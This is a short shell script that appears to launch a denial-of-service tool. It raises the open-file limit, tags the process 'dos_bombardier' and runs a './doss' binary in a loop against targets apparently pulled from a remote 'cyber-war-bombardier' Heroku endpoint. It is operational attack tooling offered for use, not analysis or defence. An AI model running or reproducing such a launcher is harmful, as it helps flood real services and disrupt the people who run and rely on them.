DIR="$( cd "$( dirname "$0" )" && pwd )"
cd "$DIR"

./stop.sh

ulimit -n 5000

instance_id=dos_bombardier

filter="instance.id=$instance_id"
nohup ./loop.sh ./doss "https://cyber-war-bombardier.herokuapp.com/json?activeOnly" & echo ok
printf "\n"
ps -v | grep $filter
printf "\n"
